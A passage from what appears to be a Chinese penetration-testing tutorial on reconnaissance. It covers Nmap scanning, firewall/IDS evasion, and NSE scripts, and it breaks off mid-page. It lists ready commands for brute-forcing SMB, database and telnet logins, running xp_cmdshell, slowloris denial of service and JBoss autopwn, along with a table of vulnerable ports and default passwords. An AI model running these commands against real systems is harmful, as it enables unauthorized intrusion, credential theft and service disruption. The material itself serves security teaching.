–sn**\n\nNmap会发送四种不同类型的数据包来探测目标主机是否在线。\n\n&amp;nbsp;\n\nICMP echo request\n\na TCP SYN packet to port 443(https)\n\na TCP ACK packet to port 80(http)\n\nan ICMP timestamp request\n\n依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误\n\n\n**nmap -PE/-PP/-PM**\n\n\\-PE 的ICMP Echo扫描简单来说是通过向目标发送ICMP Echo数据包来探测目标主机是否存活，但由于许多主机的防火墙会禁止这些报文，所以仅仅ICMP扫描通常是不够的。\n\n\\-PP 的ICMP time stamp时间戳扫描在大多数防火墙配置不当时可能会得到回复，可以以此方式来判断目标主机是否存活。倘若目标主机在线，该命令还会探测其开放的端口以及运行的服务\n\n\\-PM 的ICMP address maskPing[\\[S6\\]](# \&quot;#_msocom_6\&quot;) 地址掩码扫描会试图用备选的ICMP等级Ping指定主机，通常有不错的穿透防火墙的效果\n\n\n##### 当探测内网IP时\n\n**nmap -sn**\n\n使用 nmap  -sn  内网ip   这个命令会发送arp请求包探测目标ip是否在线，如果有arp回复包，则说明在线。此命令可以探测目标主机是否在线，如果在线，还可以得到其MAC地址。但是不会探测其开放的端口号。\n\n**nmap -PE/-PP/-PM**\n\n使用nmap -PE/PP/PM  内网ip 探测主机的开启情况，使用的是ARP请求报文，如果有ARP回复报文，说明主机在线。-PP/PE/PM命令探测到主机在线后，还会探测主机的端口的开启状态以及运行的服务\n\n### 7.2.2 端口扫描及原理\n\n##### 原理\n\n端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。\n\n默认情况下，Nmap会扫描1000个最有可能开放的TCP端口\n\nNmap通过探测将端口划分为6个状态：\n\nopen：端口是开放的。\n\nclosed：端口是关闭的。\n\nfiltered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。\n\nunfiltered：端口没有被屏蔽，但是否开放需要进一步确定。\n\nopen|filtered：端口是开放的或被屏蔽，Nmap不能识别。\n\nclosed|filtered ：端口是关闭的或被屏蔽，Nmap不能识别\n\n**TCP SYN** **扫描(-sS)**\n\n这是Nmap默认的扫描方式，通常被称作半开放扫描。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么可以判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么可以判断该端口被屏蔽了。因为该方式仅发送SYN包对目标主机的特定端口，但不建立完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。\n\n**TCP connent** **扫描(-sT)**\n\nTCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标主机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式\n\n**TCP ACK** **扫描(-sA)**\n\n向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。**该方式只能用于确定防火墙是否屏蔽某个端口**，可以辅助TCP SYN的方式来判断目标主机防火墙的状况\n\n**TCP FIN/Xmas/NULL** **扫描(-sN/sF/sX)**\n\n这三种扫描方式被称为秘密扫描，因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN 包或Xmas tree包或NULL包，如果收到对方的RST回复包，那么说明该端口是关闭的；没有收到RST包说明该端口可能是开放的或者被屏蔽了。其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有的flags都为0的TCP包。\n\n**UDP\\*\\*\\*\\*扫描(-sU)**\n\nUDP扫描用于判断UDP端口的情况，向目标主机的UDP端口发送探测包，如果收到回复ICMP port unreachable就说明该端口是关闭的；如果没有收到回复，那说明该UDP端口可能是开放的或者屏蔽的。因此，通过反向排除法的方式来判断哪些UDP端口是可能处于开放状态的。\n\n**其他方式(-sY/-sZ)**\n\n除了以上几种常用的方式外，Nmap还支持多种其他的探测方式。例如使用SCTP INIT/Cookie-ECHO方式是来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型(tcp/udp/icmp/sctp等等)；使用idle scan方式借助僵尸主机来扫描目标主机，以达到隐蔽自己的目的；或者使用FTP bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐蔽自己的目的\n\n##### 简单扫描（nmap ip）\n\n例如： nmap 202.207.236.2这个命令会按照 nmap-services 文件中指定的端口进行扫描，然后列出目标主机开放的端口号，以及端口号上运行的服务。在一次简单扫描中，Nmap会以默认TCP SYN扫描方式进行，仅判断目标端口是否开放，若开放，则列出端口对应的服务名称。\n\n**探测端口开放过程**：确定主机在线之后，nmap会按照nmap-services文件中的端口号发送TCP SYN报文给主机相应的端口，如果主机回复一个包含TCP SYN、ACK的报文，则说明该端口号开放。nmap会再回复一个TCP RST清除连接复位。下面的截图是nmap是和目标主机的80号端口的探测过程，由此可见，目标主机的22号端口属于开放状态\n![](img/16.png)\n##### 全面扫描(nmap -A ip)\n\n进攻式扫描（慎用）\n\n例如：nmap -A 202.207.236.2 这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！\n![](img/15.png)\n全面扫描时数据流量包的截图，确定了哪些端口的协议开启了之后，进行更加深入的探测！\n![](img/17.png)\n\n##### 探测指定端口的开放状态\n```\nnmap -p 80-445 10.96.10.246 扫描目标主机的80-445端口的开放情况\nnmap -sS -sU --top-ports 100 10.96.10.246 \n```\n参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；--top-ports 100表示扫描最有可能开放的100个端口（TCP和UDP分别100个端口）。\n\n### 7.2.3 版本侦测\n\n版本侦测，用于确定目标主机开放端口上运行的具体的应用程序及版本信息。\n\nNmap提供的版本侦测具有如下的优点：\n* 高速。并行地进行套接字操作，实现一组高效的探测匹配定义语法。\n* 尽可能地确定应用名字与版本名字。\n* 支持TCP/UDP协议，支持文本格式与二进制格式。\n* 支持多种平台服务的侦测，包括Linux/Windows/Mac OS/FreeBSD等系统。\n* 如果检测到SSL，会调用openSSL继续侦测运行在SSL上的具体协议（如HTTPS/POP3S/IMAPS）。\n* 如果检测到SunRPC服务，那么会调用brute-force RPC grinder进一步确定RPC程序编号、名字、版本号。\n* 支持完整的IPv6功能，包括TCP/UDP，基于TCP的SSL。\n* 通用平台枚举功能（CPE）\n* 广泛的应用程序数据库（nmap-services-probes）。目前Nmap可以识别几千种服务的签名，包含了180多种不同的协议。\n\n##### 原理\n\n本侦测主要分为以下几个步骤：\n\n\n首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。\n\n如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。\n\n通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。\n\n如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。\n\n如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。\n\n如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。\n\n如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。\n\n##### 用法\n\n比如目标主机把SSH的22号端口改成了2222端口，那么如果使用普通扫描只会发现2222端口是开启的，并不能知道2222号端口上运行的程序，通过加参数  -sV  进行版本扫描，可以探测到目标主机上2222端口运行的是SSH服务\n\n\\-sV: 指定让Nmap进行版本侦测\n\n\\--version-intensity &amp;lt;level&amp;gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。\n\n\\--version-light: 指定使用轻量侦测方式 (intensity 2)\n\n\\--version-all: 尝试使用所有的probes进行侦测 (intensity 9)\n\n\\--version-trace: 显示出详细的版本侦测过程信息\n\n### 7.2.4 OS侦测\n\n##### 原理\n\nNmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。\n\n协议栈指纹识别是一项强大的技术，能够以很高的概率迅速确定操作系统的版本。虽然TCP/IP协议栈的定义已经成为一项标准，但是各个厂家，如微软和RedHat等在编写自己的TCP/IP协议栈时，却做出了不同的解释。这些解释因具有独一无二的特性，故被称为“指纹”。通过这些细微的差别，可以准确定位操作系统的版本\n\n具体实现方式如下：\n\nNmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。\n\n分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。\n\n将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。\n\n##### 用法\n\n\\-O: 指定Nmap进行OS侦测。\n\n\\--osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。\n\n\\--osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统\n例： \n`nmap -O 10.96.10.246`\n\n## 7.3 nmap高级功能\n\n防火墙与IDS规避为用于绕开防火墙与IDS的检测与屏蔽，以便能够更加详细地发现目标主机的状况。nmap提供了多种规避技巧通常可以从两个方面考虑规避方式：数据包的变换(Packet Change)和时序变换(Timing Change)\n\n### 7.3.1 防火墙/IDS规避\n\n* 分片\n将可疑的探测包进行分片处理(例如将TCP包拆分成多个IP包发送过去)，某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查\n* IP诱骗(IP decoys)\n在进行扫描时，将真实IP地址在和其他主机的IP地址混合使用(其他主机需要在线，否则目标主机将回复大量数据包到不存在的数主机，从而实质构成了DOS攻击)，以此让目标主机的防火墙或IDS追踪大量的不同IP地址的数据包，降低其追查到自身的概率。但是，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实的IP地址\n* IP伪装\nIP伪装就是将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机与之通信。需要注意的是，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan 或匿名代理等网络技术\n* 指定源端口\n某些目标主机只允许来自特定端口的数据包通过防火墙。例如，FTP服务器的配置为允许源端口为21号的TCP包通过防火墙与FTP服务器通信，但是源端口为其他的数据包被屏蔽。所以，在此类情况下，可以指定数据包的源端口\n* 扫描延时\n某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率。所以，我们可以降低发包的频率和发包延时以此降低目标主机的审查强度\n* 其他技术\nnmap还提供其他多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址，使用错误检查。\n```\n-f; --mtu &amp;lt;val&amp;gt;: 指定使用分片、指定数据包的 MTU.\n-D &amp;lt;decoy1,decoy2\\[,ME\\],...&amp;gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址。\n-S &amp;lt;IP_Address&amp;gt;: 伪装成其他 IP 地址\n-e &amp;lt;iface&amp;gt;: 使用特定的网络接口\n-g/--source-port &amp;lt;portnum&amp;gt;: 使用指定源端口\n--data-length &amp;lt;num&amp;gt;: 填充随机数据让数据包长度达到 Num。\n--ip-options &amp;lt;options&amp;gt;: 使用指定的 IP 选项来发送数据包。\n--ttl &amp;lt;val&amp;gt;: 设置 time-to-live 时间。\n--spoof-mac &amp;lt;mac address/prefix/vendor name&amp;gt;: 伪装 MAC 地址\n--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）\n```\n示例：\n```\nnmap -F -Pn -D 10.96.10.100,10.96.10.110,ME -e eth0 -g 5555 202.207.236.3\n```\n\\-F参数表示快速扫描100个端口，-Pn不进行ping扫描，-D表示使用ip诱骗方式掩饰真实ip，使用的是10.96.10.100和10.96.10.110，ME表示自己真实的ip，这里是10.96.10.234，-e 参数指定eth0网卡发送数据包，-g参数指定发送的端口号\n\n### NSE脚本引擎\nNSE脚本引擎(Nmap Scripting Engine)是nmap最强大，最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展nmap的功能。\n\nnmap的脚本库的路径：/usr/share/nmap/scripts或/xx/nmap/scripts/ ，该目录下的文件都是nse脚本\n\nNSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含了14个类别的350多个脚本。NSE的设计初衷主要考虑以下几个方面:\n* 网络发现（Network Discovery）\n* 更加复杂的版本侦测（例如 skype 软件）\n* 漏洞侦测(Vulnerability Detection)\n* 后门侦测(Backdoor Detection)\n* 漏洞利用(Vulnerability Exploitation)\n##### 分类扫描\n\nNmap的脚本主要分为以下几类：\n* auth: 负责处理鉴权证书（绕开鉴权）的脚本\n* broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务\n* brute: 提供暴力破解方式，针对常见的应用如http/snmp等\n* default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力\n* discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等\n* dos: 用于进行拒绝服务攻击\n* exploit: 利用已知的漏洞入侵系统\n* external: 利用第三方的数据库或资源，例如进行whois解析\n* fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽\n* malware: 探测目标机是否感染了病毒、开启了后门等信息\n* safe: 此类与intrusive相反，属于安全性脚本\n* version: 负责增强服务与版本扫描（Version Detection）功能的脚本\n* vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067\n**示例：**\n```\nnmap --script=auth 192.168.137.\\* 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令\n```\n![](img/18.png)\n```\nnmap --script-brute 192.168.1.1 #nmap可对数据库、SMB、SNMP等进行简单密码的暴力破解\n```\n![](img/19.png)\n```\nnmap --script=default 192.168.137.\\* 或者 nmap -sC 192.168.137.\\*\n```\n默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击\n![](img/20.png)\n```\nnmap --script-vuln 192.168.1.1 #扫描是否有常见漏洞\n```\n![](img/21.png)\n```\nnmap -n -p445 --script=broadcast 192.168.137.4\n```\n在局域网内探查更多服务开启状况\n![](img/22.jpg)\n```\nnmap --script external 202.103.243.110\n```\n利用第三方的数据库或资源，例如进行whois解析\n##### 应用扫描\n\n* vnc扫描\n```\nnmap --script=realvnc-auth-bypass 192.168.137.4\n# 检查vnc认证方式\nnmap --script=vnc-auth  192.168.137.4\n# 获取vnc信息\nnmap --script=vnc-info 192.168.137.4\n```\n* smb扫描\n```\nnmap --script=smb-brute.nse 192.168.137.4\n# smb字典破解\nnmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4\n# smb已知的几个漏洞\nnmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4\n# 查看共享目录\nnmap -p 445 --script smb-ls--script-args ‘share=e\\$,path=\\\\,smbuser=test,smbpass=test’ 192.168.137.4\n#查询主机一些敏感信息（注：需要下载nmap_service）\nnmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test192.168.137.4\n# 查看会话\nnmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test192.168.137.4\n# 系统信息\nnmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test192.168.137.4\n```\n* mssql扫描\n```\n# 破解mssql用户名密码\nnmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd192.168.137.4\n# xp_cmdshell 执行命令\nnmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=\&quot;net user\&quot; 192.168.137.4\n```\n* mysql扫描\n```\n# 扫描root空口令\nnmap –p 3306 --script=mysql-empty-password.nse 192.168.137.4\n# 列出所有mysql用户\nnmap –p 3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4\n# 支持同一应用的所有脚本扫描\nnmap --script=mysql-\\* 192.168.137.4\n```\n* oracle扫描\n```\n# oracle sid扫描\nnmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5\n# oracle弱口令破解\nnmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd192.168.137.5\n```\n* 其它好用的脚本\n```\nnmap --script=broadcast-netbios-master-browser 192.168.137.4 发现网关\nnmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module=www&#39; 192.168.137.4 破解rsync\nnmap --script informix-brute -p 9088 192.168.137.4 informix数据库破解\nnmap -p 5432 --script pgsql-brute 192.168.137.4 pgsql破解\nnmap -sU --script snmp-brute 192.168.137.4 snmp破解\nnmap -sV --script=telnet-brute 192.168.137.4 telnet破解\nnmap --script=http-vuln-cve2010-0738 --script-args &#39;http-vuln-cve2010-0738.paths={/path1/,/path2/}&#39; &amp;lt;target&amp;gt; jboss autopwn\nnmap --script=http-methods.nse 192.168.137.4 检查http方法\nnmap --script http-slowloris --max-parallelism 400 192.168.137.4 dos攻击，对于处理能力较小的站点还挺好用的 &#39;half-HTTP&#39; connections\nnmap --script=samba-vuln-cve-2012-1182 -p 139 192.168.137.4\n```\n可查看脚本内容，查找脚本所调用的文件，并修改。\n## 常见危险端口对应的服务\n```\n20：FTP服务的数据传输端口\n21：FTP服务的连接端口，可能存在  弱口令暴力破解\n22：SSH服务端口，可能存在 弱口令暴力破解\n23：Telnet端口，可能存在 弱口令暴力破解\n25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应\n43：whois服务端口\n53：DNS服务端口(TCP/UDP 53)\n67/68：DHCP服务端口\n69：TFTP端口，可能存在弱口令\n80：HTTP端口，常见web漏洞\n110：POP3邮件服务端口，和SMTP的25端口对应\n135：RPC服务\n137/138： NMB服务\n139：SMB/CIFS服务\n143：IMAP协议端口\n161/162: Snmp服务，public弱口令\n389：LDAP目录访问协议，有可能存在注入、弱口令\n443：HTTPS端口，心脏滴血等与SSL有关的漏洞\n445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010\n512/513/514：Linux Rexec服务端口，可能存在爆破\n873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞\n1080：socket端口，可能存在爆破\n1099：RMI，可能存在 RMI反序列化漏洞\n1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露\n1433：SQL Server对外提供服务端口\n1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口\n1521：oracle数据库端口\n2049：NFS服务端口，可能存在NFS配置不当\n2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞\n2375：Docker端口，可能存在 Docker未授权访问漏洞\n2601:   Zebra ，默认密码zebr\n3128:   squid ，匿名访问（可能内网漫游）\n3306：MySQL数据库端口，可能存在 弱口令暴力破解\n3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现\n3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞\n4440：Rundeck，弱口令admin\n4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）\n4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)\n4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin\n5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞\n5432：PostGreSQL数据库的端口\n5632：PyAnywhere服务端口，可能存在代码执行漏洞\n5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞\n5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞\n6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞\n7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞\n7180：Cloudera manager端口\n8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞\n8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell\n8080-8090：可能存在web服务\n8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞\n8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）\n9000：fastcgi端口，可能存在远程命令执行漏洞\n9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)\n9043/9090：WebSphere，可能存在WebSphere反序列化漏洞\n9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞\n10000：Webmin-Web控制面板，可能存在弱口令\n10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)\n11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞\n27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞\n50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。\n50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞\n61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现\n60020：hbase.regionserver.port，HRegionServer的RPC端口\n60030：hbase.regionserver.info.port，HRegionServer的http端口\n```\n# 网站敏感目录和文件\n扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏\n* 后台目录：弱口令，万能密码，爆破\n* 安装包：获取数据库信息，甚至是网站源码\n* 上传目录：截断、上传图片马等\n* mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell\n* 安装页面 ：可以二次安装进而绕过\n* phpinfo：会把你配置的各种信息暴露出来\n* 编辑器：fck、ke、等\n* iis短文件利用：条件比较苛刻  windows、apache等\n* 提到了网站敏感目录我们就不得不提 robots.txt 文件了\n* robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。\n假如编写的robots.txt文件内容如下：\n```\nUser-agent: \\*\nDisallow: /data/\nDisallow: /db/\nDisallow: /admin/\nDisallow: /manager/\nAllow:/images/\n```\n其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/  即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。\n\n虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。\n\n探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等\n\n## dirbuster\n\nDirbuster是一种履带式和粗暴式的混合物; 它遵循它找到的页面中的所有链接，但也为可能的文件尝试不同的名称。这些名称可能位于与我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。\n\n为确定文件是否存在，DirBuster使用服务器的响应代码。最常见的响应如下所示：\n\n200 ok：文件存在\n\n404找不到404文件：服务器中不存在该文件\n\n301 301永久移动：这是重定向到给定的URL\n\n401 Unauthorized:访问此文件需要身份验证\n\n403 Forbidden：请求有效但服务器拒绝响应\n\n基本用法：dirb 网站地址\n\n# 旁站和C段扫描\n\n旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！\n\n对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。\n\n旁站和C段在线查询地址：\n* http://www.webscan.cc/\n* https://phpinfo.me/bing.php&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/信息收集.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1.png&quot;],[0,&quot;img/2.png&quot;],[0,&quot;img/3.png&quot;],[0,&quot;img/4.png&quot;],[0,&quot;img/5.png&quot;],[0,&quot;img/6.png&quot;],[0,&quot;img/7.png&quot;],[0,&quot;img/8.png&quot;],[0,&quot;img/9.png&quot;],[0,&quot;img/10.png&quot;],[0,&quot;img/11.png&quot;],[0,&quot;img/12.png&quot;],[0,&quot;img/13.png&quot;],[0,&quot;img/14.png&quot;],[0,&quot;img/16.png&quot;],[0,&quot;img/15.png&quot;],[0,&quot;img/17.png&quot;],[0,&quot;img/18.png&quot;],[0,&quot;img/19.png&quot;],[0,&quot;img/20.png&quot;],[0,&quot;img/21.png&quot;],[0,&quot;img/22.jpg&quot;]]],&quot;digest&quot;:[0,&quot;dd106f0c3d802cc4&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;前言\&quot;&gt;前言&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#前言\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;方式：主动扫描，开放搜索等。&lt;/p&gt;\n&lt;p&gt;开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。&lt;/p&gt;\n&lt;p&gt;基础信息：IP、网段、域名、端口。&lt;/p&gt;\n&lt;p&gt;应用信息：各端口的应用。例如web应用、邮件应用、等等。&lt;/p&gt;\n&lt;p&gt;系统信息：操作系统版本&lt;/p&gt;\n&lt;p&gt;版本信息：所有这些探测到的东西的版本。&lt;/p&gt;\n&lt;p&gt;服务信息：中间件的各类信息，插件信息。&lt;/p&gt;\n&lt;p&gt;人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。&lt;/p&gt;\n&lt;p&gt;防护信息：试着看能否探测到防护设备。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;逆向pwn ,逆向工程、web、移动&lt;/p&gt;\n&lt;p&gt;主动信息收集：通过直接访问、扫描网站，这种流量将流经网站&lt;/p&gt;\n&lt;p&gt;被动信息收集：利用第三方的服务对目标进行访问了解，比例： Shodan搜索等&lt;/p&gt;\n&lt;p&gt;详见Shodan使用手册。&lt;/p&gt;\n&lt;h1 id=\&quot;在线搜索shodan\&quot;&gt;在线搜索（Shodan）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#在线搜索shodan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。&lt;/p&gt;\n&lt;p&gt;在windows系统上访问Shodan只需要访问链接：&lt;a href=\&quot;https://www.shodan.io/\&quot;&gt;https://www.shodan.io/&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;shodan工作原理\&quot;&gt;Shodan工作原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#shodan工作原理\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器，或者哪个ip对应的主机是哪种设备。&lt;/p&gt;\n&lt;h2 id=\&quot;shodan的使用\&quot;&gt;Shodan的使用&lt;a 